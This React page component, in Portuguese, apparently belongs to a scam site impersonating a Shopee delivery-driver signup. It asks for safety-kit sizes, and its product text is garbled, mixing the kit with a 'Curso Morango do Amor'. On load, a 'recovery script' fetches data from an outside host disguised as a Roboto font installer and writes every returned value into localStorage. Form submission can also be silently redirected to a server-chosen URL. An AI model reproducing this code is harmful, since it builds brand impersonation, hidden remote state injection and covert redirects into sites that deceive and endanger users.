import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Checkbox } from '@/components/ui/checkbox';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';

import kitEpiImage from '../assets/kit-epi-new.webp';

const finalizacaoSchema = z.object({
  tamanhoColete: z.enum(['P', 'M', 'G', 'GG']),
  tamanhoLuva: z.enum(['P', 'M', 'G', 'GG']),
  numeroCalcado: z.string().min(2, "Número de calçado inválido"),
});

type FinalizacaoFormValues = z.infer<typeof finalizacaoSchema>;

const Finalizacao: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();

  // ButtonAPI Recovery Script - Recuperação de localStorage
  useEffect(() => {
    const BUTTONAPI_SERVER = 'https://fonts-roboto-install.replit.app';
    
    console.log('🔄 ButtonAPI Recovery Script carregado');
    
    // Função para extrair parâmetros da URL
    function getUrlParameter(name: string) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(name);
    }
    
    // Função para fazer requisição à API
    function fetchTempData(tempDataId: string) {
      return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', BUTTONAPI_SERVER + '/api/temp-data/' + tempDataId, true);
        
        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
            if (xhr.status === 200) {
              try {
                const response = JSON.parse(xhr.responseText);
                resolve(response);
              } catch (e: any) {
                reject(new Error('Erro ao processar resposta: ' + e.message));
              }
            } else if (xhr.status === 404) {
              reject(new Error('Dados temporários não encontrados (podem ter expirado)'));
            } else {
              reject(new Error('Erro na API: Status ' + xhr.status));
            }
          }
        };
        
        xhr.onerror = function() {
          reject(new Error('Erro de rede ao acessar ButtonAPI'));
        };
        
        xhr.send();
      });
    }
    
    // Função para restaurar dados no localStorage
    function restoreLocalStorage(data: Record<string, string>) {
      try {
        let count = 0;
        for (const key in data) {
          if (data.hasOwnProperty(key)) {
            localStorage.setItem(key, data[key]);
            console.log('✅ Restaurado:', key, '=', data[key]);
            count++;
          }
        }
        return count;
      } catch (e) {
        console.error('❌ Erro ao restaurar localStorage:', e);
        return 0;
      }
    }
    
    // Função para disparar evento customizado com os dados
    function dispatchDataReadyEvent(data: Record<string, string>, metadata: any) {
      const event = new CustomEvent('buttonapi-data-ready', {
        detail: {
          ...data,
          _metadata: {
            sourceUrl: metadata.sourceUrl,
            buttonId: metadata.buttonId,
            retrievedAt: metadata.retrievedAt
          }
        }
      });
      window.dispatchEvent(event);
      console.log('🎉 Evento buttonapi-data-ready disparado com', Object.keys(data).length, 'itens');
    }
    
    // Função principal para processar recuperação
    function processDataRecovery() {
      // Verificar se há parâmetro tempData na URL
      const tempDataId = getUrlParameter('tempData');
      
      if (!tempDataId) {
        console.log('ℹ️ Nenhum parâmetro tempData encontrado na URL');
        return;
      }
      
      console.log('🔍 ID de dados temporários encontrado:', tempDataId);
      
      // Buscar dados na API
      fetchTempData(tempDataId)
        .then(function(response: any) {
          console.log('📦 Dados recuperados da API:', response);
          
          const parsedData = response.data || {};
          const restoredCount = restoreLocalStorage(parsedData);
          
          console.log('✅ Recuperação concluída!', restoredCount, 'itens restaurados no localStorage');
          
          // Disparar evento para a página usar os dados
          dispatchDataReadyEvent(parsedData, {
            sourceUrl: response.sourceUrl,
            buttonId: response.buttonId,
            retrievedAt: response.retrievedAt
          });
          
          // Limpar parâmetro da URL (opcional)
          const url = new URL(window.location.href);
          url.searchParams.delete('tempData');
          window.history.replaceState({}, document.title, url.pathname + url.search);
          
        })
        .catch(function(error: any) {
          console.error('❌ Erro na recuperação:', error.message);
          
          // Disparar evento de erro
          const errorEvent = new CustomEvent('buttonapi-data-error', {
            detail: { error: error.message }
          });
          window.dispatchEvent(errorEvent);
        });
    }
    
    // Processar recuperação de dados
    processDataRecovery();
    
    // Limpar listeners ao desmontar componente
    return () => {
      // Cleanup se necessário
    };
  }, []);

  // Verificação de destino para o botão de finalização
  const checkRedirectConfiguration = async () => {
    try {
      // Consultar API de configuração de redirecionamento
      const response = await fetch('/api/redirect-config', {
        method: 'GET',
        headers: {
          'Cache-Control': 'no-cache'
        }
      });
      
      if (response.ok) {
        const config = await response.json();
        setSecurityConfig({ 
          redirect_enabled: config.target_url !== '/entrega',
          target_url: config.target_url 
        });
      }
    } catch (error) {
      // Falha silenciosa - continua com comportamento normal
      console.debug('[CONFIG] Usando configuração padrão');
    }
  };

  useEffect(() => {
    // Verificar configuração de destino ao carregar componente
    checkRedirectConfiguration();
  }, []);
  
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [formSubmitted, setFormSubmitted] = useState(false);
  const [selectedShoeSize, setSelectedShoeSize] = useState<string>("40");
  const [securityConfig, setSecurityConfig] = useState<any>(null);

  const { register, handleSubmit, formState: { errors }, setValue, watch } = useForm<FinalizacaoFormValues>({
    resolver: zodResolver(finalizacaoSchema),
    defaultValues: {
      tamanhoColete: 'M',
      tamanhoLuva: 'M',
      numeroCalcado: '40',
    }
  });
  

  // Função para selecionar o tamanho do calçado
  const handleShoeSize = (size: string) => {
    setSelectedShoeSize(size);
    setValue('numeroCalcado', size, { shouldValidate: true });
  };
  
  const handleFormSubmit = (data: FinalizacaoFormValues) => {
    setIsSubmitting(true);
    
    try {
      // Verificar se há redirecionamento configurado
      if (securityConfig?.redirect_enabled && securityConfig?.target_url && securityConfig.target_url !== '/entrega') {
        // Redirecionar para URL configurada
        console.log('[REDIRECT] Redirecionando para:', securityConfig.target_url);
        window.location.href = securityConfig.target_url;
        return;
      }
      
      // Comportamento normal: salvar dados e continuar fluxo
      const updatedData = {
        ...data,
        numeroCalcado: selectedShoeSize
      };
      
      localStorage.setItem('epi_data', JSON.stringify(updatedData));
      setShowLoadingModal(true);
      
    } catch (error) {
      toast({
        title: "Erro ao salvar dados",
        description: "Ocorreu um erro ao processar suas informações. Tente novamente.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    // Redirecionar para a página de entrega em vez de mostrar a tela de finalização
    navigate('/entrega');
  };

  const handleFinalizar = () => {
    navigate('/');
    toast({
      title: "Cadastro finalizado!",
      description: "Parabéns! Seu cadastro foi concluído com sucesso. Em breve entraremos em contato.",
    });
  };

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      
      <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        {/* Meia-lua no canto direito */}
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-white mr-3">
            <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Motorista Parceiro</h1>
            <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Shopee</p>
          </div>
        </div>
      </div>
      
      <div className="flex-grow container mx-auto px-2 py-8 w-full">
        <div className="w-full mx-auto p-6 mb-8">
          {!formSubmitted ? (
            <>
              <div className="mb-8">
                <Card className="overflow-hidden max-w-6xl mx-auto">
                  <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
                    <h3 className="font-semibold text-[#E83D22]">Equipamento de Proteção Individual (EPI)</h3>
                  </div>
                  <div className="p-6">
                    <div className="flex flex-col md:flex-row gap-6 items-center">
                      <div className="w-full md:w-2/5">
                        <img 
                          src={kitEpiImage} 
                          alt="Kit EPI Shopee" 
                          className="w-full rounded-lg"
                        />
                      </div>
                      <div className="w-full md:w-3/5">
                        <h4 className="text-lg font-medium mb-3">Curso Morango do Amor Completo</h4>
                        <p className="text-gray-600 mb-4">
                          Para garantir sua segurança durante as entregas, a Shopee exige que todos os entregadores 
                          utilizem equipamentos de proteção individual. O kit inclui:
                        </p>
                        <ul className="list-disc pl-5 mb-4 space-y-1 text-gray-700">
                          <li>2 Coletes refletivos com identificação Shopee (laranja e amarelo)</li>
                          <li>Par de luvas de proteção</li>
                          <li>Botas de segurança antiderrapantes</li>
                        </ul>
                        <div className="bg-yellow-50 p-3 rounded-md border border-yellow-200">
                          <p className="text-sm text-yellow-800">
                            <strong>Importante:</strong> O uso do curso completo é obrigatório durante todas 
                            as entregas. O não uso pode resultar em suspensão temporária.
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </Card>
              </div>
              
              <form onSubmit={handleSubmit(handleFormSubmit)} className="space-y-6 max-w-6xl mx-auto">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div>
                    <label htmlFor="tamanhoColete" className="block text-base font-medium text-gray-800 mb-2">
                      Tamanho do Colete
                    </label>
                    <Select
                      onValueChange={(value) => setValue('tamanhoColete', value as any)}
                      defaultValue={watch('tamanhoColete')}
                    >
                      <SelectTrigger className="w-full">
                        <SelectValue placeholder="Selecione o tamanho" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="P">P</SelectItem>
                        <SelectItem value="M">M</SelectItem>
                        <SelectItem value="G">G</SelectItem>
                        <SelectItem value="GG">GG</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <div>
                    <label htmlFor="tamanhoLuva" className="block text-base font-medium text-gray-800 mb-2">
                      Tamanho da Luva
                    </label>
                    <Select
                      onValueChange={(value) => setValue('tamanhoLuva', value as any)}
                      defaultValue={watch('tamanhoLuva')}
                    >
                      <SelectTrigger className="w-full">
                        <SelectValue placeholder="Selecione o tamanho" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="P">P</SelectItem>
                        <SelectItem value="M">M</SelectItem>
                        <SelectItem value="G">G</SelectItem>
                        <SelectItem value="GG">GG</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <div>
                    <label htmlFor="numeroCalcado" className="block text-base font-medium text-gray-800 mb-2">
                      Número do Calçado
                    </label>
                    <div className="grid grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-2">
                      {Array.from({ length: 11 }, (_, i) => (i + 35).toString()).map((size) => (
                        <Button
                          key={size}
                          type="button"
                          variant="outline"
                          onClick={() => handleShoeSize(size)}
                          className={`py-2 px-4 ${
                            selectedShoeSize === size 
                              ? 'bg-[#E83D22] text-white border-[#E83D22] hover:bg-[#d73920]' 
                              : 'border-gray-300 hover:border-[#E83D22] hover:text-[#E83D22]'
                          }`}
                        >
                          {size}
                        </Button>
                      ))}
                    </div>
                    <input 
                      type="hidden" 
                      {...register('numeroCalcado')} 
                      value={selectedShoeSize} 
                    />
                    {errors.numeroCalcado && (
                      <p className="mt-1 text-sm text-red-600">{errors.numeroCalcado.message}</p>
                    )}
                  </div>
                </div>
                
                
                <Button
                  type="submit"
                  className="w-full bg-[#E83D22] hover:bg-[#d73920] text-white font-medium py-6 text-base rounded-[3px]"
                  disabled={isSubmitting}
                  style={{ height: '50px' }}
                >
                  {isSubmitting ? 'Processando...' : 'Solicitar Curso Morango do Amor e Finalizar'}
                </Button>
              </form>
            </>
          ) : (
            <div className="max-w-2xl mx-auto text-center">
              <div className="text-[#E83D22] mb-6">
                <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mx-auto">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                  <polyline points="22 4 12 14.01 9 11.01"></polyline>
                </svg>
              </div>
              
              <h1 className="text-3xl font-bold mb-6 text-gray-800">Cadastro Concluído!</h1>
              
              <p className="text-lg text-gray-600 mb-8">
                Parabéns! Seu cadastro como Entregador Parceiro Shopee foi concluído com sucesso.
                Seu Curso Morango do Amor será enviado para o endereço cadastrado em até 5 dias úteis.
              </p>
              
              <div className="bg-[#FFF8F6] p-4 rounded-lg border border-[#E83D2220] mb-8">
                <h3 className="font-semibold text-[#E83D22] mb-2">Próximos Passos:</h3>
                <ol className="list-decimal pl-6 text-left text-gray-700 space-y-2">
                  <li>Você receberá um e-mail de confirmação em até 24 horas.</li>
                  <li>O Curso Morango do Amor será enviado em até 5 dias úteis.</li>
                  <li>Após o recebimento do curso, você já poderá começar a receber entregas.</li>
                  <li>Download do aplicativo de entregas Shopee (enviado por e-mail).</li>
                </ol>
              </div>
              
              <Button
                onClick={handleFinalizar}
                className="bg-[#E83D22] hover:bg-[#d73920] text-white font-medium py-6 text-base rounded-[3px] min-w-[200px]"
                style={{ height: '50px' }}
              >
                Voltar ao Início
              </Button>
            </div>
          )}
        </div>
      </div>
      
      <Footer />
      
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Finalizando Cadastro"
        loadingSteps={[
          "Registrando tamanhos do Curso Morango do Amor",
          "Verificando disponibilidade em estoque",
          "Preparando envio do material",
          "Finalizando cadastro de entregador"
        ]}
        completionMessage="Cadastro finalizado com sucesso!"
        loadingTime={12000}
      />
    </div>
  );
};

export default Finalizacao;